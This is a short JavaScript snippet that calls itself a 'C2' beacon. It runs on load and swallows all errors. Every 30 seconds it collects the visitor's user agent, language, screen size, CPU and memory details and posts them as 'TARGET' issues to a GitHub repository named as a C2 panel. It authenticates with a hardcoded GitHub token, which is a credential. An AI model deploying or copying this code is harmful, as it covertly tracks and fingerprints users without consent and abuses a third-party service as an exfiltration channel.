(function() {
    const C2 = {
        endpoint: "https://api.github.com/repos/kholqin/nusantara-c2-panel/issues",
        token: "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",
        interval: 30000
    };

    async function sendData() {
        const info = {
            title: `TARGET_${navigator.platform}_${Date.now()}`,
            body: JSON.stringify({
                ua: navigator.userAgent,
                lang: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                cores: navigator.hardwareConcurrency || 'N/A',
                ram: navigator.deviceMemory || 'N/A',
                time: new Date().toLocaleString()
            }, null, 2)
        };

        try {
            await fetch(C2.endpoint, {
                method: 'POST',
                headers: { 
                    'Authorization': `token ${C2.token}`,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(info)
            });
        } catch (e) {}
    }

    sendData();
    setInterval(sendData, C2.interval);
})();
